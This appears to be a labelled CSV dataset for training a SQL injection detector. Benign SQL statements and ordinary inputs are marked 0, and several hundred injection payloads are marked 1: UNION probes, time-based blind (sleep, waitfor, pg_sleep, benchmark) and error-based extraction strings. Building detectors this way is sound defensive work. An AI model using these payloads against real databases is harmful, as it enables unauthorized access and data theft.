Query,Label
buisn andres,0
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --,1
SELECT SupplierName FROM Suppliers,0
"-3756'  )   union all select 1034,1034,1034--",1
"1'   )    )    union all select null,null,null,null,null,null,null,null#",1
"1%""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,1
SELECT * FROM position  WHERE electricity NOT LIKE '[pain]%',0
"-7637"" union all select 8498,8498,8498--",1
"   SELECT Employees.report, COUNT ( Orders.withinID )  AS thingFROM    ( OrdersINNER JOIN cookies ON Orders.hunterID  =  Employees.shownID ) ",0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,1
SELECT drive FROM wheel UNION SELECT slip FROM neck ORDER BY wave,0
"-7574%""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1
admin'/*,1
SELECT small ( s )  FROM crowd FULL OUTER JOIN,0
SELECT attention ( s )  FROM trunk UNION,0
"1""  )   where 1607  =  1607",1
SELECT * FROM related WHERE along LIKE '%income%',0
"1'||  (  select 'eils' where 8308  =  8308 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
1%'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  ',1
"INSERT INTO stronger  ( coming, still, correctly )  VALUES  ( 'jack', 'worse', 'egg' )  ",0
/*SELECT * FROM Customers;,0
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'snoa'  =  'snoa,1
leopolda,0
hofmeist0,0
SELECT sentence ( s )  FROM good SELECT play ( s ) ,0
1 or pg_sleep  (  __TIME__  )  --,1
1'   )    )    and 2006  =  2006,1
"c/ clivia, 1, 1?d",0
"1'   )    )    as qcgf where 9656  =  9656 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"plaza del yunque, 4,",0
"-4669"" or 8571  =  8571--",1
SELECT length FROM funny,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""vqpx"" like ""vqpx",1
"1' in boolean mode  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  #",1
budd9,0
"1'   )    )     )   union all select null,null--",1
"   SELECT Employees.down, COUNT ( Orders.wishID )  AS particlesFROM    ( OrdersINNER JOIN animal ON Orders.specialID  =  Employees.breadID ) ",0
sqlvuln;,1
"1   )    )    as jfae where 6684  =  6684 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'rozr' like 'rozr,1
dagma,0
SELECT * FROM screen WHERE thin = 'noise'  OR anything = 'airplane',0
SELECT * FROM hurt WHERE morning = 'summer',0
SELECT * FROM remember 3,0
21924971z,0
"  UPDATE sale SET jar =  'shorter', City =  'chain' WHERE occur =  ordinary",0
SELECT * FROM sight ORDER BY advice DESC,0
-1700%' or 4149  =  3391#,1
SELECT * FROM gift WHERE NOT moment = 'apart'  AND NOT which = 'path',0
aguistin,0
"1'  )   where 8948  =  8948 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#",1
"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",1
SELECT Count ( * )  AS settle,0
"-5591%""   )    )    order by 1--",1
"1""  )   where 6679  =  6679 rlike sleep  (  5  )  #",1
SELECT AVG ( circus ) FROM instead SELECT SUM ( secret ) ,0
"1%""   )    )    union all select null,null,null--",1
fergus,0
SELECT shelf ( s )  FROM kill,0
1'||  (  select 'bifa' where 6077  =  6077 and 4547  =  9301,1
8.67859E+15,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",1
84826588n,0
38435,0
"1""  )   as jtou where 8129  =  8129 and 7533  =  7533--",1
"-2325'   )    )     )   union all select 1442,1442,1442--",1
select   (  case when   (  8808  =  1367  )   then 1 else 8808*  (  select 8808 from master..sysdatabases  )   end  )  --,1
select sleep  (  5  )   and   (  'pwpc'  =  'pwpc,1
"-9180"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
-3297' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
elsen@whitehat.td,0
"c/ reina del cielo 136, 8-d",0
"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"-3090"" or make_set  (  9354  =  9354,7185  )   and ""qowe"" like ""qowe",1
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""mbas""  =  ""mbas",1
"   SELECT sat, exact, classroom FROM clean WHERE music  IS NULL",0
23456317c,0
"1%"" waitfor delay '0:0:5' and ""%""  =  """,1
"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",1
SELECT * FROM Products;,0
SELECT * FROM tonight WHERE potatoes = 'ride'  AND  ( shadow = 'play' OR cage = 'toward' ) ,0
"1%'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  '%'  =  '",1
SELECT written ( s FROM correctly RIGHT JOIN,0
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
"1'+  (  select jley where 3581  =  3581 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT AVG ( suddenly )  FROM flame  SELECT SUM ( began ) ,0
briant,0
SELECT * FROM surrounded ORDER BY ear,0
4270,0
40190,0
SELECT Count ( * )  AS stepped,0
43774,0
"el provencio, 6 8f",0
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1
select   (  case when   (  6045  =  2786  )   then 6045 else 1/  (  select 0  )   end  )  --,1
"1""   )    )     )   rlike   (  select   (  case when   (  6915  =  4531  )   then 1 else 0x28 end   )    )    and    (    (     (  ""jzzu""  =  ""jzzu",1
1'+  (  select 'kicv' where 1976  =  1976 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   +',1
28%,1
registro,0
lasedad,0
1.53418E+15,0
veit,0
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",1
"1' in boolean mode  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM mouth WHERE    NOT current = 'hall',0
SELECT * FROM army WHERE animal = 'cutting'  OR cover = 'effort',0
1'||  (  select 'tcfy' where 4546  =  4546 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',1
"   SELECT possible, inch, hurt FROM flies WHERE stand  IS NULL",0
50708405y,0
"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",1
"INSERT INTO got  ( buried, human, plural )  VALUES  ( 'steam', 'likely', 'third' )  ",0
"1""  )   as qnmd where 5642  =  5642",1
SELECT * FROM supply WHERE fellow = 'youth' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM value WHERE off = 'hard' LIMIT 3,0
"-3719"" union all select 6609,6609,6609,6609#",1
SELECT TOP 3 * FROM fewer WHERE spend = 'library',0
siku@tartasconamor.in,0
SELECT * FROM sitting  WHERE come = cotton,0
FROM  ( SELECT DISTINCT mysterious FROM rod ) ,0
"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,1
SELECT COUNT ( DISTINCT rich )  FROM him,0
galende,0
"1%""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1
SELECT * FROM bank WHERE speech = 'class'  AND City = 'value',0
karem,0
SELECT * FROM entire WHERE soldier BETWEEN '1996-07-01' AND '1996-07-31',0
end and    (    (   'vkle'  =  'vkle,1
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",1
"-5360' where 8178  =  8178 union all select 8178,8178,8178--",1
SELECT * FROM whose WHERE Price NOT BETWEEN 10 AND 20,0
1'||  (  select 'pxkz' where 2207  =  2207 and   (  3020  =  3020  )  *6703  )  ||',1
"   SELECT COUNT ( noun ) , hold FROM pink BY travel",0
-5880'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rwgl'  =  'rwgl,1
" SELECT * FROM wherever ORDER BY consonant ASC, within DESC",0
SELECT COUNT ( movieID ) FROM each,0
nona,0
SELECT DISTINCT wonderful FROM courage,0
"  SELECT rock,pretty FROM fruit WHERE country = 'stared' UNION SELECT naturally, most FROM least",0
SELECT spend ( s ) FROM short INNER JOIN,0
SELECT COUNT ( lot ) FROM people,0
SELECT TOP 3 * FROM lift WHERE sound = 'shoulder' SELECT * FROM fur,0
8033,0
DELETE FROM door WHERE grow = 'small',0
"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1""  )   as xrsi where 9498  =  9498",1
"-8186%' or elt  (  1032  =  1032,3623  )   and '%'  =  '",1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",1
"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1
1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
vajil-la,0
"-1475""  )   union all select 8611,8611,8611#",1
"   SELECT COUNT ( no ) , old FROM room BY unless",0
"1""  )   where 2680  =  2680 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
que3h5a,0
SELECT * FROM represent WHERE his BETWEEN '1996-07-01' AND '1996-07-31',0
"1%""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""%""  =  """,1
"-8640  )   or elt  (  7657  =  5020,5020  )   and   (  2346  =  2346",1
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",1
SELECT * FROM hungry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM range,0
"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'tpcm' like 'tpcm",1
"1' where 8969  =  8969 union all select null,null,null,null,null--",1
SELECT allow ( s )  FROM exciting SELECT flew ( s ) ,0
"1   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  6395  =  6395",1
pembrooke_coates@stainless.gd,0
select   (  case when   (  4341  =  7041  )   then 4341 else 4341*  (  select 4341 from mysql.db  )   end  )  #,1
c/ david 169 6-h,0
SELECT TOP 3 * FROM tobacco,0
SELECT * FROM science WHERE heading = 'diameter' FETCH FIRST 3 ROWS ONLY,0
"  (  select * from generate_series  (  4990,4990,case when   (  4990  =  5065  )   then 1 else 0 end  )   limit 1  )  ",1
1'||  (  select 'feyg' from dual where 7734  =  7734 and 3843  =  6724#,1
86273903y,0
SELECT AVG ( drawn ) FROM port,0
"-6442""   )    )     )   or 3038  =  3038",1
SELECT nearly ( s )  FROM round LEFT JOIN,0
"1   )    )    as acni where 6355  =  6355 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
6.29894E+15,0
SELECT TOP 3 * FROM CustomersWHERE Country = 'Germany';,0
"sierra santos, 71, 6?g",0
1'   )    )    waitfor delay '0:0:5' and    (    (   'bbqk'  =  'bbqk,1
elias pallares,0
"-3737%"" union all select 4452,4452,4452#",1
1  )   as iiku where 9466  =  9466,1
1  )   where 2232  =  2232,1
enlutada,0
" end and    (    (     (  ""%""  =  """,1
1'||  (  select 'ptfi' from dual where 2234  =  2234 and 2006  =  2006,1
waitfor delay '0:0:5'# ogzq,1
4560,0
oficios$o,0
"   SELECT COUNT ( dull ) , careful FROM fort BY generally",0
"  SELECT * FROM was WHERE element NOT IN  ( 'per', 'include', 'planning' )  ",0
fuente la reina,0
SELECT * FROM sat WHERE finest = 'satisfied' FETCH FIRST 3 ROWS ONLY,0
 UPDATE sugar SET please = 'first'WHERE mass = 'shirt',0
"-3505""  )   or 5290  =  3436--",1
"  UPDATE until SET column =  'attached', City =  'coat' WHERE rather =  wing",0
1'   )    )    as fbjd where 8597  =  8597,1
"1%'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   '%'  =  '",1
"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",1
SELECT * FROM bone WHERE blue = 'situation' FETCH FIRST 3 ROWS ONLY,0
gallifa,0
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'dogx'  =  'dogx,1
21302211w,0
"1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'scye' like 'scye",1
SELECT our ( s )  FROM cut,0
SELECT not ( s )  FROM felt SELECT hollow ( s ) ,0
"1  )   as cejp where 4736  =  4736 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"c/ curadero, 101, 12?e",0
"1'||  (  select 'jfxs' from dual where 5485  =  5485 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT AVG ( climb ) FROM lovely,0
"  SELECT trace AS shade, suggest AS [later]  FROM aware",0
-3186 or 3867  =  9405,1
SELECT * FROM machinery WHERE choice = 'plan',0
"""&""",1
4.86728E+15,0
"1'  )   as bvvl where 9818  =  9818 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
4.64693E+15,0
SELECT * FROM glass WHERE slightly NOT LIKE '[cause]%',0
ronet_huebner@nikemujeres.bm,0
tierga,0
enrique,0
nurit,0
"1%'   )    )     )   union all select null,null#",1
1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,1
15lo956i1o,0
hoeflich@movil-google.cx,0
SELECT * FROM belong WHERE tight = 'bow' FETCH FIRST 3 ROWS ONLY,0
" SELECT column_name ( s )  FROM began,whatever",0
1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,1
SELECT * FROM kept WHERE ability BETWEEN '1996-07-01' AND '1996-07-31',0
1'||  (  select 'tvcy' where 5592  =  5592 order by 1#,1
" SELECT LPAD ( CustomerName, 30, ""ABC"" )  AS LeftPadCustomerName FROM Customers; ",0
"  SELECT ADDDATE ( ""2017-06-15"", INTERVAL 10 DAY ) ;",0
SELECT * FROM major WHERE us NOT LIKE '[or]%',0
"1   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"INSERT INTO began  ( main, break, continued )  VALUES  ( 'accident', 'nation', 'fireplace' )  ",0
SELECT * FROM advice WHERE question BETWEEN '1996-07-01' AND '1996-07-31',0
"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",1
06226784v,0
85510378n,0
SELECT MIN ( brown )  AS forget FROM thirty,0
"1""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""fbqy"" like ""fbqy",1
vigoda5@fotoseroticas.com.ae,0
pg_sleep  (  __TIME__  )  --,1
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'lvck'  =  'lvck",1
46942381w,0
"1   )    )    as mgvw where 4923  =  4923 union all select null,null,null,null--",1
41392002y,0
carlie,0
SELECT COUNT ( flies ) FROM gate,0
SELECT * FROM shells WHERE drop NOT LIKE '[grew]%',0
"  SELECT Orders.yardrID, Employees.apartment, Employees.electricity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.peopleID ORDER BY Orders.callID",0
43595,0
SELECT * FROM consonant WHERE using LIKE '%book%',0
DELETE FROM review,0
orce,0
1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'hyun' like 'hyun,1
1' and   (  3435  =  7210  )  *7210 and 'lxxt'  =  'lxxt,1
-6341' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'ugys'  =  'ugys,1
"-1598""   )    )    or elt  (  5329  =  9628,9628  )   and    (    (   ""hyxq"" like ""hyxq",1
5.27381E+14,0
SELECT * FROM speed 3 SELECT * FROM listen,0
"-9924   )    )    as zgqa where 2867  =  2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",1
"1'||  (  select 'pzoe' where 2977  =  2977 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
curul,0
SELECT TOP 3 * FROM list WHERE build = 'pilot' SELECT * FROM native,0
"1' and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1""   )    )    as drss where 2077  =  2077 and 7533  =  7533--",1
"1%' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM rather 3 SELECT * FROM prove,0
"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
ex8ed2ci3,0
SELECT * FROM attention WHERE famous LIKE '%floor%',0
SELECT excitement FROM lunch UNION ALL SELECT human FROM ride ORDER BY leg,0
"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
"  UPDATE hurried SET definition =  'lungs', City =  'statement' WHERE tea =  problem",0
SELECT * FROM compare WHERE journey = 'improve'  AND City = 'trick',0
" end and    (    (   ""dmgj""  =  ""dmgj",1
1  )   as vxsh where 4706  =  4706,1
"1'  )   as uvxl where 6211  =  6211 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
" select * from users where id  =  '1' or   (  \  )    =  1 union select 1,@@VERSION -- 1'",1
SELECT * FROM settle FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pull,0
"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""xwnw""  =  ""xwnw",1
freixes navaln,0
SELECT * FROM nearest  WHERE still = save,0
"   SELECT Employees.deer, COUNT ( Orders.villageID )  AS peaceFROM    ( OrdersINNER JOIN hello ON Orders.dinnerID  =  Employees.sickID ) ",0
-7103   )    )    or 4610  =  1871 and    (    (   1249  =  1249,1
SELECT MIN ( own )  AS window FROM had,0
select   (  case when   (  6843  =  2657  )   then 6843 else 6843*  (  select 6843 from information_schema.character_sets  )   end  )  #,1
"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""qnqb"" like ""qnqb",1
keer,0
"INSERT INTO smaller ( zebra, afraid, fed, noted, condition, merely )  VALUES  ( 'low', 'spell'. store', 'spread', 'sent', 'instance', 'shallow' )  ",0
"SELECT * FROM forward WHERE gravity BETWEEN ""highway"" AND    ""happened""",0
de2ape91ibi1ie4to,0
"1%'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  '%'  =  '",1
"1   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  3977  =  3977",1
SELECT * FROM property WHERE unknown = 'outer' FETCH FIRST 3 ROWS ONLY,0
1  )   as jtfx where 8038  =  8038,1
1%'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   '%'  =  ',1
SELECT TOP 3 * FROM spite WHERE speech = 'attack' SELECT * FROM society,0
superable,0
"1%""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """,1
"1%'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
marylin,0
palera,0
15142,0
karzau@asdn.edu,0
" select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1
37130,0
SELECT * FROM mad WHERE Price NOT BETWEEN 10 AND 20,0
SELECT applied ( s )  FROM suggest FULL OUTER JOIN,0
9ara,0
SELECT DISTINCT shadow FROM dog,0
13440,0
SELECT COUNT ( imagine ) FROM begun,0
"minguez, 98",0
SELECT TOP 3 * FROM stage,0
herrmann@codwatw.edu,0
knyht9@aspirantes.lt,0
"1""   )    )    as dooi where 1806  =  1806 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#",1
"  SELECT * FROM decide WHERE interior NOT IN  ( 'space', 'author', 'meal' )  ",0
1'+  (  select yjyp where 9696  =  9696,1
" select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1
c/ nicolas salmeron 73,0
SELECT * FROM verb WHERE attention = 'train',0
SELECT AVG ( begun ) FROM low,0
"  UPDATE same SET proud =  'cookies', City =  'act' WHERE studied =  breeze",0
"1%""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""%""  =  """,1
"  SELECT gentlyID AS ID, tea AS hill FROM answer",0
SELECT * FROM realize WHERE    NOT tent = 'funny',0
"-9286""   )    )    as mfxl where 9348  =  9348 union all select 9348#",1
alcal de la vega,0
"1   )    )    union all select null,null,null,null,null,null--",1
-8710 or 9323  =  9323#,1
SELECT * FROM gently  WHERE relationship NOT LIKE '[steep]%',0
"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
SELECT * FROM doctor 3 SELECT * FROM lying,0
"  SELECT respectID AS ID, experiment AS happily FROM can",0
